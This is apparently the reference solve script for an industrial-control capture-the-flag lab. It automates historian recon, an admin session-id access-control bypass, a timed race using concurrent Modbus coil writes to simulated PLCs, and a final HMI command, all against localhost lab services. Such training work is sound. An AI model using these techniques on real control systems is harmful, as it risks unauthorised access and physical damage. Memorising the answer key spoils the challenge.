"""
solutions/solve.py
Reference / regression-test solve script for Interceptor Down.

Exercises: historian recon (Stage 2), engineering-ws blind access-control
bypass (Stage 3), the plc-radar/plc-battery TOCTOU race (Stage 4), and the
final HMI command (Stage 6).

Defaults assume you're running `docker compose up --build` and hitting the
published host ports from the default (non-hardened) docker-compose.yml.
Adjust the HOST/PORT constants below if you've changed the port mappings
or are running this from inside the Docker network instead.
"""
import json
import socket
import struct
import sys
import os
import threading
import time
import urllib.request

sys.path.insert(0, os.path.dirname(__file__))
from modbus_client_mini import ModbusMiniClient

HISTORIAN_HOST, HISTORIAN_PORT = "localhost", 7878
EWS_HOST = "http://localhost:8081"
RADAR_HOST, RADAR_PORT = "localhost", 5020
BATTERY_HOST, BATTERY_PORT = "localhost", 5021
HMI_HOST = "http://localhost:8082"

MAGIC = b"\xCA\xFE"


def checksum(data):
    c = 0
    for b in data:
        c ^= b
    return c


def historian_query(tag):
    body = struct.pack(">H", tag) + struct.pack(">B", 0x01)
    length = len(body)
    header = MAGIC + struct.pack(">H", length)
    full = header + body
    frame = full + bytes([checksum(full)])
    with socket.create_connection((HISTORIAN_HOST, HISTORIAN_PORT), timeout=5) as s:
        s.sendall(frame)
        resp = s.recv(4096)
    payload = resp[7:-1]
    return payload.decode(errors="replace")


def ews_signup():
    req = urllib.request.Request(EWS_HOST + "/signup", method="POST", data=b"")
    with urllib.request.urlopen(req, timeout=5) as r:
        cookie = r.headers.get("Set-Cookie", "")
    sid = cookie.split("session=")[1].split(";")[0]
    return sid


def ews_try_session(sid):
    req = urllib.request.Request(EWS_HOST + f"/api/config?session={sid}")
    with urllib.request.urlopen(req, timeout=5) as r:
        return r.read().decode()


def win_toctou_race(max_attempts=10):
    radar = ModbusMiniClient(RADAR_HOST, RADAR_PORT)
    battery = ModbusMiniClient(BATTERY_HOST, BATTERY_PORT)

    def wait_for_lock():
        while True:
            if radar.read_coils(0, 1)[0]:
                return
            time.sleep(0.1)

    def fire_attempt():
        try:
            battery.write_coil(1, True)
        except Exception:
            pass

    for attempt in range(max_attempts):
        wait_for_lock()
        remaining_ms = radar.read_registers(9, 1)[0]
        wait_s = max(0, (remaining_ms - 80) / 1000.0)
        time.sleep(wait_s)

        threads = [threading.Thread(target=fire_attempt) for _ in range(15)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        time.sleep(0.5)
        race_flag = battery.read_registers(11, 1)[0]
        print(f"  attempt {attempt}: race_flag={race_flag}")
        if race_flag == 1:
            return True

        # disarm before retrying
        try:
            battery.write_coil(1, False)
        except Exception:
            pass
        time.sleep(0.2)

    return False


def final_command():
    req = urllib.request.Request(
        HMI_HOST + "/api/command",
        method="POST",
        data=json.dumps({"command": "INTERCEPT"}).encode(),
        headers={"Content-Type": "application/json"},
    )
    with urllib.request.urlopen(req, timeout=5) as r:
        return json.loads(r.read().decode())


if __name__ == "__main__":
    print("=== Stage 2: historian recon ===")
    print(historian_query(0x0001))
    print(historian_query(0x0002))
    print(historian_query(0x0003))

    print("=== Stage 3: engineering-ws broken access control ===")
    sid = ews_signup()
    print("guest session:", sid)
    print(ews_try_session(sid))
    print("--- trying admin session id (1) directly ---")
    print(ews_try_session(1))

    print("=== Stage 4: TOCTOU race against plc-battery ===")
    won = win_toctou_race()
    print("race won:", won)

    print("=== Stage 6: final HMI command ===")
    if won:
        print(final_command())
    else:
        print("skipping final command -- race not won")
